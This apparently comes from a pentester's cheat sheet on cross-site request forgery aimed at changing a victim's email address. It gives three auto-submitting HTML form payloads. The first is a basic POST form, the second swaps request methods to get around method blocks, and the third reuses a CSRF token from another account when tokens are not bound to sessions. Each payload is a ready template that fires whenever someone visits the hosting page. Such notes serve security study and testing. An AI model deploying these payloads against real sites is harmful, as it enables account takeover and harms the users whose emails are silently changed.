# Updating someone's email via CSRF
- We can host another HTML page from the server and access it via the target (if we're allowed to do that) and the HTML page will make a malicious request.
```HTML
<form method="POST" action="https://target-url/endpoint">
	<input type="hidden" name="param-name" value="param-value">
</form>
<script>
	document.forms[0].submit();
</script>
```
- This will send a post request to change the viewer's email address everytime someone visits that page.
## Certain methods are blocked
- In some cases some methods are blocked and others aren't so try with other request methods 
```HTML
<form method="POST/GET/PUT/DELETE" action="https://target-url/endpoint">
	<input type="hidden" name="param-name" value="param-value">
</form>
<script>
	document.forms[0].submit();
</script>
```
## CSRF tokens are not tied to user sessions
- Sometimes CSRF token of one account can be used for other accounts, in such situations simply grab the csrf tokens of that account by logging into it. There maybe one as a hidden input field inside a form.
```HTML
<form method="POST" action="https://target-url/endpoint">
	<input type="hidden" name="param-name" value="param-value">
	<input type="hidden" name="csrf" value="csrf-token">
</form>
<script>
	document.forms[0].submit();
</script>
